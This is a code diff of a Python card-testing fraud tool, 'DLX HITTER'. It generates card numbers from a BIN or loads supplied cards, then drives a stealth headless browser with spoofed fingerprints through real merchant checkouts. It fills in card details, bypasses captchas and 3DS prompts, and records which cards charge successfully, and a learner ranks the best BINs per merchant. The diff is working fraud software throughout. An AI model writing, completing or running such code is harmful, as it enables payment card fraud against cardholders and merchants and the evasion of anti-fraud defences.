-                await autofill.enable_card_replace(card)
-                await autofill.fill_card(card)
-                
-                submitted = await autofill.submit()
-                if not submitted:
-                    result['error'] = 'Submit button not found'
-                    await browser.close()
-                    return result
-                
-                await asyncio.sleep(5)
-                
-                if await autofill.wait_for_3ds(10000):
-                    await autofill.auto_complete_3ds()
-                    await asyncio.sleep(5)
-                
-                await autofill.handle_captcha()
-                
-                current_url = page.url
-                result['response_time'] = time.time() - start_time
-                
-                if any(k in current_url.lower() for k in ['receipt', 'thank_you', 'success', 'order_confirmation', 'complete']):
-                    result['success'] = True
-                    result['receipt_url'] = current_url
-                    self.successes += 1
-                else:
-                    error_text = await page.text_content('body')
-                    if 'declined' in error_text.lower():
-                        result['decline_code'] = 'card_declined'
-                    else:
-                        result['decline_code'] = 'unknown'
-                    self.fails += 1
-                
-                await browser.close()
-                
-        except Exception as e:
-            result['error'] = str(e)
-            result['decline_code'] = 'exception'
-        
-        self.results.append(result)
+async def hit_single(url: str, card: Dict, attempt_num: int) -> Dict:
+    """Hit a single card against a URL. Returns result dict."""
+    start_time = time.time()
+    result = {
+        'attempt': attempt_num, 'card': card, 'success': False,
+        'decline_code': None, 'receipt_url': None,
+        'response_time': 0, 'error': None, 'provider': 'unknown',
+    }
+
+    try:
+        from playwright.async_api import async_playwright
+    except ImportError:
+        result['error'] = 'Playwright not installed'
         return result
 
-# ============= TERMINAL UI =============
-def print_url_info(info: Dict):
-    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
-    print(f"{Colors.BOLD}{'📋 URL ANALYSIS RESULTS'.center(70)}{Colors.END}")
-    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
-    print(f"{Colors.YELLOW}🔗 Checkout URL:{Colors.END} {info['url'][:80]}...")
-    print(f"{Colors.YELLOW}🏢 Merchant:{Colors.END} {Colors.GREEN}{info['merchant']}{Colors.END}")
-    if info['product'] != 'Unknown':
-        print(f"{Colors.YELLOW}📦 Product:{Colors.END} {Colors.CYAN}{info['product']}{Colors.END}")
-    if info['product_url']:
-        print(f"{Colors.YELLOW}🔗 Product URL:{Colors.END} {Colors.BLUE}{info['product_url']}{Colors.END}")
-    if info['amount']:
-        print(f"{Colors.YELLOW}💰 Amount:{Colors.END} {Colors.GREEN}{info['amount']} {info.get('currency', 'USD')}{Colors.END}")
-    else:
-        print(f"{Colors.YELLOW}💰 Amount:{Colors.END} {Colors.RED}Could not determine (JS loaded){Colors.END}")
-    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")
-
-def print_header():
-    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
-    print(f"{Colors.BOLD}{'DLX HITTER - Active Session'.center(70)}{Colors.END}")
-    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")
-
-def print_progress(current: int, total: int, successes: int, fails: int):
-    percent = (current / total) * 100
-    bar_length = 40
-    filled = int(bar_length * current / total)
-    bar = '█' * filled + '░' * (bar_length - filled)
-    print(f"\r{Colors.YELLOW}[{bar}]{Colors.END} {percent:.1f}% "
-          f"{Colors.GREEN}✓{successes}{Colors.END}/{Colors.RED}✗{fails}{Colors.END} "
-          f"({current}/{total})", end='', flush=True)
-
-def print_success(card: Dict, merchant: str, product: str, amount: str, receipt_url: str, response_time: float):
-    print(f"\n\n{Colors.GREEN}{'='*70}{Colors.END}")
-    print(f"{Colors.GREEN}{'🎉' * 10} SUCCESSFUL CHARGE! {'🎉' * 10}{Colors.END}")
-    print(f"{Colors.GREEN}{'='*70}{Colors.END}")
-    print(f"{Colors.CYAN}💳 Card:{Colors.END} {card['card']}|{card['month']}|{card['year']}|{card['cvv']}")
-    print(f"{Colors.CYAN}🏢 Merchant:{Colors.END} {merchant}")
-    if product != 'Unknown':
-        print(f"{Colors.CYAN}📦 Product:{Colors.END} {product}")
-    if amount:
-        print(f"{Colors.CYAN}💰 Amount:{Colors.END} {amount}")
-    print(f"{Colors.CYAN}⏱️ Response:{Colors.END} {response_time:.2f}s")
-    print(f"{Colors.CYAN}🔗 Receipt URL (Successful Transaction):{Colors.END} {Colors.GREEN}{receipt_url}{Colors.END}")
-    print(f"{Colors.GREEN}{'='*70}{Colors.END}\n")
-
-def print_decline(card: Dict, decline_code: str, response_time: float, attempt: int):
-    print(f"\n{Colors.RED}[✗] ATTEMPT #{attempt} DECLINED{Colors.END}")
-    print(f"    {Colors.YELLOW}💳 Card:{Colors.END} {card['card']}|{card['month']}|{card['year']}|{card['cvv']}")
-    print(f"    {Colors.YELLOW}📉 Reason:{Colors.END} {decline_code}")
-    print(f"    {Colors.YELLOW}⏱️ Time:{Colors.END} {response_time:.2f}s")
-
-def print_final_stats(successes: int, fails: int, total_time: float, url_info: Dict):
-    total = successes + fails
-    success_rate = (successes / total * 100) if total > 0 else 0
-    
-    print(f"\n\n{Colors.CYAN}{'='*70}{Colors.END}")
-    print(f"{Colors.BOLD}{'🎯 FINAL STATISTICS 🎯'.center(70)}{Colors.END}")
-    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
-    print(f"{Colors.YELLOW}🏢 Merchant:{Colors.END} {url_info['merchant']}")
-    if url_info['product'] != 'Unknown':
-        print(f"{Colors.YELLOW}📦 Product:{Colors.END} {url_info['product']}")
-    if url_info['amount']:
-        print(f"{Colors.YELLOW}💰 Amount:{Colors.END} {url_info['amount']} {url_info.get('currency', 'USD')}")
-    print(f"{Colors.CYAN}{'-'*70}{Colors.END}")
-    print(f"{Colors.GREEN}✓ Successful:{Colors.END} {successes}")
-    print(f"{Colors.RED}✗ Failed:{Colors.END} {fails}")
-    print(f"{Colors.YELLOW}📊 Success Rate:{Colors.END} {success_rate:.1f}%")
-    print(f"{Colors.YELLOW}⏱️ Total Time:{Colors.END} {total_time:.2f}s")
-    if total > 0:
-        print(f"{Colors.YELLOW}⚡ Avg Time:{Colors.END} {total_time/total:.2f}s")
-    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")
-
-# ============= MAIN APPLICATION =============
-class DLXHitter:
-    def __init__(self):
-        self.url = None
-        self.url_info = None
-        self.cards = []
-        self.pattern_learner = CardPatternLearner()
-        self.engine = HitterEngine()
-        self.rate_limiter = SmartRateLimiter()
-    
-    def get_url_and_analyze(self):
-        print(f"\n{Colors.CYAN}{'─'*50}{Colors.END}")
-        print(f"{Colors.BOLD}{'📌 STEP 1: ENTER CHECKOUT URL'.center(50)}{Colors.END}")
-        print(f"{Colors.CYAN}{'─'*50}{Colors.END}")
-        self.url = input(f"{Colors.WHITE}🔗 URL: {Colors.END}").strip()
-        
-        print(f"\n{Colors.YELLOW}[!] Analyzing URL...{Colors.END}")
-        try:
-            headers = {'User-Agent': random.choice(USER_AGENTS)}
-            resp = requests.get(self.url, timeout=15, verify=False, headers=headers, allow_redirects=True)
-            if resp.status_code == 200:
-                html = resp.text
-                merchant = URLAnalyzer.extract_merchant(html)
-                product = URLAnalyzer.extract_product_name(html)
-                amount = URLAnalyzer.extract_amount(html)
-                if merchant != 'Unknown' and product not in [None, 'Stripe Checkout', 'Checkout', 'Shopify Checkout']:
-                    self.url_info = {
-                        'url': self.url,
-                        'merchant': merchant,
-                        'product': product or 'Unknown',
-                        'product_url': URLAnalyzer.extract_product_url(html),
-                        'amount': amount,
-                        'currency': URLAnalyzer.extract_currency(html),
-                        'success': True
-                    }
-                    print_url_info(self.url_info)
-                    return
-        except Exception as e:
-            pass
-        
-        print(f"{Colors.YELLOW}[!] Static analysis incomplete.{Colors.END}")
-        print(f"{Colors.YELLOW}[?] Perform deep analysis with Playwright? (y/n): {Colors.END}", end='')
-        choice = input().strip().lower()
-        if choice == 'y':
-            print(f"{Colors.CYAN}[!] Performing deep analysis (this may take a few seconds)...{Colors.END}")
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            self.url_info = loop.run_until_complete(URLAnalyzer.deep_analyze_with_playwright(self.url))
-            loop.close()
-            if self.url_info['success']:
-                self.url_info['url'] = self.url
-                print_url_info(self.url_info)
-            else:
-                print(f"{Colors.RED}[!] Deep analysis failed: {self.url_info.get('error', 'Unknown')}{Colors.END}")
-                self.url_info = {'url': self.url, 'merchant': 'Unknown', 'product': 'Unknown', 'amount': None, 'success': False}
-        else:
-            self.url_info = {'url': self.url, 'merchant': 'Unknown', 'product': 'Unknown', 'amount': None, 'success': False}
-            print(f"{Colors.YELLOW}[!] Continuing with limited information.{Colors.END}")
-    
-    def get_cards_or_bins(self):
-        print(f"\n{Colors.CYAN}{'─'*50}{Colors.END}")
-        print(f"{Colors.BOLD}{'📌 STEP 2: SELECT CARD SOURCE'.center(50)}{Colors.END}")
-        print(f"{Colors.CYAN}{'─'*50}{Colors.END}")
-        print(f"{Colors.GREEN}[1]{Colors.END} Generate cards from BIN")
-        print(f"{Colors.GREEN}[2]{Colors.END} Load existing cards")
-        
-        choice = input(f"{Colors.WHITE}Choice (1/2): {Colors.END}").strip()
-        
-        if choice == '1':
-            print(f"\n{Colors.YELLOW}[!] BIN format: 424242 or 424242|12|26|123{Colors.END}")
-            bin_input = input(f"{Colors.WHITE}🔢 BIN: {Colors.END}").strip()
-            
-            print(f"{Colors.WHITE}🎴 How many cards? (1-{MAX_ATTEMPTS}): {Colors.END}")
-            count = min(int(input().strip()), MAX_ATTEMPTS)
-            
-            self.cards = CardGenerator.generate_cards(bin_input, count)
-            print(f"{Colors.GREEN}[✓] {len(self.cards)} cards generated{Colors.END}")
-        else:
-            print(f"\n{Colors.YELLOW}[!] Enter cards (cc|mm|yy|cvv) one per line, empty line to finish{Colors.END}")
-            while True:
-                line = input(f"{Colors.WHITE}💳 Card {len(self.cards)+1}: {Colors.END}").strip()
-                if not line:
-                    break
-                parts = line.split('|')
-                if len(parts) == 4:
-                    self.cards.append({
-                        'card': parts[0],
-                        'month': parts[1].zfill(2),
-                        'year': parts[2].zfill(2),
-                        'cvv': parts[3]
-                    })
-                else:
-                    print(f"{Colors.RED}[!] Invalid format! Use: 4242424242424242|12|26|123{Colors.END}")
-            print(f"{Colors.GREEN}[✓] {len(self.cards)} cards loaded{Colors.END}")
-    
-    def run(self):
-        print_banner()
-        init_db()
-        
-        self.get_url_and_analyze()
-        self.get_cards_or_bins()
-        
-        if not self.cards:
-            print(f"{Colors.RED}[!] No cards loaded! Exiting...{Colors.END}")
-            return
-        
-        suggested = self.pattern_learner.suggest_best_pattern(self.url_info['merchant'])
-        if suggested:
-            print(f"\n{Colors.CYAN}[🧠 AI SUGGESTION]{Colors.END} Best BIN: {Colors.GREEN}{suggested}{Colors.END}")
-        
-        print_header()
-        start_time = time.time()
-        
-        async def run_hits():
-            for i, card in enumerate(self.cards[:MAX_ATTEMPTS]):
-                if i > 0:
-                    last_result = 'declined'
-                    if self.engine.results and self.engine.results[-1].get('success'):
-                        last_result = 'success'
-                    delay = self.rate_limiter.calculate_delay(last_result)
-                    await asyncio.sleep(delay)
-                
-                result = await self.engine.hit(
-                    self.url, card,
-                    self.url_info['merchant'],
-                    self.url_info.get('product', 'Unknown'),
-                    self.url_info.get('amount', 'Unknown'),
-                    i+1
-                )
-                
-                if result.get('success'):
-                    print_success(result['card'], self.url_info['merchant'],
-                                self.url_info.get('product', 'Unknown'),
-                                self.url_info.get('amount', 'Unknown'),
-                                result.get('receipt_url', 'N/A'),
-                                result['response_time'])
-                    self.pattern_learner.learn(result['card'], self.url_info['merchant'], True)
-                else:
-                    print_decline(result['card'], result.get('decline_code', 'error'),
-                                result['response_time'], result['attempt'])
-                    self.pattern_learner.learn(result['card'], self.url_info['merchant'], False)
-                
-                print_progress(i+1, min(len(self.cards), MAX_ATTEMPTS),
-                             self.engine.successes, self.engine.fails)
-        
-        asyncio.run(run_hits())
-        
-        total_time = time.time() - start_time
-        print_final_stats(self.engine.successes, self.engine.fails, total_time, self.url_info)
-        
-        conn = sqlite3.connect(DATABASE)
-        c = conn.cursor()
-        for result in self.engine.results:
-            c.execute("""INSERT INTO hits (timestamp, card, merchant, product, amount, success, decline_code, receipt_url, response_time) 
-                        VALUES (?,?,?,?,?,?,?,?,?)""",
-                      (datetime.now().isoformat(),
-                       f"{result['card']['card']}|{result['card']['month']}|{result['card']['year']}|{result['card']['cvv']}",
-                       self.url_info['merchant'],
-                       self.url_info.get('product', 'Unknown'),
-                       self.url_info.get('amount', 'Unknown'),
-                       1 if result.get('success') else 0,
-                       result.get('decline_code', ''),
-                       result.get('receipt_url', ''),
-                       result.get('response_time', 0)))
-        conn.commit()
-        conn.close()
-        
-        print(f"{Colors.GREEN}[✓] Results saved to database{Colors.END}")
-
-def main():
     try:
-        app = DLXHitter()
-        app.run()
-    except KeyboardInterrupt:
-        print(f"\n\n{Colors.YELLOW}[!] Process interrupted by user{Colors.END}")
-    except Exception as e:
-        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
-        import traceback
-        traceback.print_exc()
+        async with async_playwright() as p:
+            fingerprint = FingerprintGenerator.generate()
 
-if __name__ == "__main__":
-    main()
+            browser = await p.chromium.launch(
+                headless=True,
+                args=['--disable-blink-features=AutomationControlled', '--no-sandbox']
+            )
+
+            context = await browser.new_context(
+                user_agent=fingerprint['user_agent'],
+                viewport=fingerprint['viewport'],
+                locale=fingerprint['locale'],
+                timezone_id=fingerprint['timezone_id'],
+                ignore_https_errors=True,
+            )
+            page = await context.new_page()
+
+            await page.add_init_script(FingerprintGenerator.get_stealth_script())
+            await page.goto(url, timeout=60000, wait_until='domcontentloaded')
+            await asyncio.sleep(3)
+
+            provider = detect_provider(url, await page.content())
+            result['provider'] = provider
+
+            autofill_class = AUTOFILL_MAP.get(provider)
+            if not autofill_class:
+                result['error'] = f'Unsupported provider: {provider}'
+                await browser.close()
+                return result
+
+            autofill = autofill_class(page)
+            await autofill.handle_captcha()
+            await autofill.enable_card_replace(card)
+            await autofill.fill_card(card)
+
+            submitted = await autofill.submit()
+            if not submitted:
+                result['error'] = 'Submit button not found'
+                await browser.close()
+                return result
+
+            await asyncio.sleep(5)
+
+            if await autofill.wait_for_3ds(10000):
+                await autofill.auto_complete_3ds()
+                await asyncio.sleep(5)
+
+            await autofill.handle_captcha()
+
+            current_url = page.url
+            result['response_time'] = time.time() - start_time
+
+            if any(k in current_url.lower() for k in ['receipt', 'thank_you', 'success', 'order_confirmation', 'complete', 'thank-you', 'order-confirmation']):
+                result['success'] = True
+                result['receipt_url'] = current_url
+            else:
+                error_text = await page.text_content('body')
+                if 'declined' in error_text.lower():
+                    result['decline_code'] = 'card_declined'
+                else:
+                    result['decline_code'] = 'unknown'
+
+            await browser.close()
+
+    except Exception as e:
+        result['error'] = str(e)[:120]
+        result['decline_code'] = 'exception'
+
+    result['response_time'] = time.time() - start_time
+    return result
+
+
+def parse_card_line(line: str) -> Optional[Dict]:
+    """Parse CC|MM|YY|CVV into a card dict."""
+    parts = line.strip().split('|')
+    if len(parts) != 4:
+        return None
+    return {
+        'card': parts[0].strip(),
+        'month': parts[1].strip().zfill(2),
+        'year': parts[2].strip().zfill(2),
+        'cvv': parts[3].strip(),
+        'brand': CardGenerator.get_card_brand(parts[0].strip()),
+    }
